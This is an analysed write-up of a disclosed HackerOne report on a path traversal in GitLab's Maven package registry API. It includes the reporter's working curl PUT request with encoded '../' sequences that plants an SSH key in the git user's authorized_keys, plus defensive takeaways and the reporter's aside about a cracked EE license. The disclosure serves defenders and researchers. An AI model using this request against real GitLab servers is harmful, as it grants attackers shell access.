# Path Traversal in GitLab Package Registry API Leading to RCE

## Metadata
- **Source:** HackerOne
- **Report:** 733072 | https://hackerone.com/reports/733072
- **Submitted:** 2019-11-09
- **Reporter:** saltyyolk
- **Program:** GitLab
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Path Traversal, Arbitrary File Write, Remote Code Execution
- **CVEs:** None
- **Category:** memory-binary

## Summary
A path traversal vulnerability in GitLab's Maven package registry API (v12.4.2-ee) allows authenticated attackers to write arbitrary files to any location writable by the git user. By exploiting this flaw, an attacker can inject their SSH public key into the git user's authorized_keys file, gaining shell access to the GitLab server.

## Attack scenario
1. Attacker enables package registry on a GitLab instance (enabled by default)
2. Attacker creates or uses an existing project with valid credentials/private token
3. Attacker crafts a malicious PUT request to the Maven package API endpoint with URL-encoded path traversal sequences (../ encoded as %2e%2e%2f)
4. Attacker traverses from the package storage directory to the .ssh directory of the git user via path traversal payload
5. Attacker supplies their SSH public key as the request body, which gets written to ~/.ssh/authorized_keys
6. Attacker connects via SSH as the git user and achieves remote code execution on the server

## Root cause
The package registry API endpoint fails to properly validate and sanitize file paths in the PUT request handler, allowing path traversal sequences to escape the intended package storage directory. The application does not strip or block URL-encoded traversal sequences (%2e%2e%2f) before constructing the file path.

## Attacker mindset
An attacker with valid GitLab credentials (private token) recognizes that package registry endpoints handle file uploads without proper path validation. By combining URL encoding to bypass naive filters with knowledge of the git user's home directory structure, they can write to sensitive locations. The choice of authorized_keys is strategic as it provides direct shell access without requiring code execution in the application context.

## Defensive takeaways
- Implement strict path canonicalization and validation on all file operations; reject requests containing traversal sequences (../, .., %2e%2e%2f, etc.) after URL decoding
- Use allowlists for valid file paths rather than blacklists; confine all package uploads to a dedicated directory with no escape mechanism
- Apply principle of least privilege: run application processes with minimal required permissions; separate git SSH keys from application-accessible directories
- Implement proper access controls on sensitive files (.ssh directories should not be writable by application processes)
- Validate file paths are within expected directory using realpath() or similar canonicalization before write operations
- Add file operation monitoring and logging to detect suspicious path traversal attempts
- Require additional authentication/authorization for operations on files outside expected package directories

## Variant hunting
Search for similar path traversal vulnerabilities in other GitLab APIs that handle file uploads or storage (container registry, npm registry, generic package registry). Look for inconsistent path validation across different file handling endpoints. Check for URL decoding issues in other parts of the codebase where paths are constructed from user input. Examine if the fix applied to report #732330 (referenced as similar) was comprehensively applied to all registry types.

## MITRE ATT&CK
- T1190
- T1048.004
- T1078.001
- T1021.006
- T1070.001

## Notes
Report references a similar vulnerability (#732330) indicating this may be part of a systematic issue across GitLab's package registry implementations. The attacker used URL encoding (%2e%2e%2f) to bypass basic path traversal filters. The vulnerability requires authentication but with low privilege (ability to create projects and API tokens is typically available to most GitLab users). Writing to authorized_keys is particularly dangerous as it grants immediate SSH access without requiring application-level code execution. The docker environment and port exposure details provide good reproduction context.

## Full report
<details><summary>Expand</summary>

### Summary
This one is similar to #732330 but much simpler.
A path traversal issue in GitLab package registry API allow an attacker to write any file at any location writable to user git in a GitLab server.

### Steps to reproduce

1. Enable package registry in your GitLab instance.
2. Create a project (package registry is enabled by default)
3. Create a private token to call the API
4. Send the following request

```
curl -H "Private-Token: $(cat token)" http://10.26.0.5/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub
```
Then run `ssh git@10.26.0.5` to enjoy a shell.

### Examples

{F630231}

In my setup, I did't expose the 22 port of GitLab docker container, so I logged in the server with its docker IP, 172.18.0.2. In case there's any misunderstandings.

#### Results of GitLab environment info

```
$ gitlab-rake gitlab:env:info

System information
System:		
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.3p62
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	3.2.12
Git Version:	2.22.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.4.2-ee
Revision:	a3170599aa2
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.9
URL:		http://10.26.0.5
HTTP Clone URL:	http://10.26.0.5/some-group/some-project.git
SSH Clone URL:	git@10.26.0.5:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	10.2.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

```
# my docker-compose.yml
version: '3'
services:
  web:
    image: 'gitlab/gitlab-ee:latest'
    restart: always
    hostname: 'localhost'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://10.26.0.5'
        gitlab_rails['packages_enabled'] = true
    ports:
      - '10.26.0.5:80:80'
  #    - '10.26.0.5:22:22'
    volumes:
      - './config:/etc/gitlab'
      - './logs:/var/log/gitlab'
      - './data:/var/opt/gitlab'
      - ./crack/pub.pem:/opt/gitlab/embedded/service/gitlab-rails/.license_encryption_key.pub:ro
```
Please forgive me to use a crack on my self hosted testing purpose GitLab EE instance :)

## Impact

This path traversal issue could be easily exploited by overwriting some critical files related to server access. In my example I use authorized_keys of git user to enable the shell access for the attacker.

</details>

---
*Analysed by Claude on 2026-05-11*
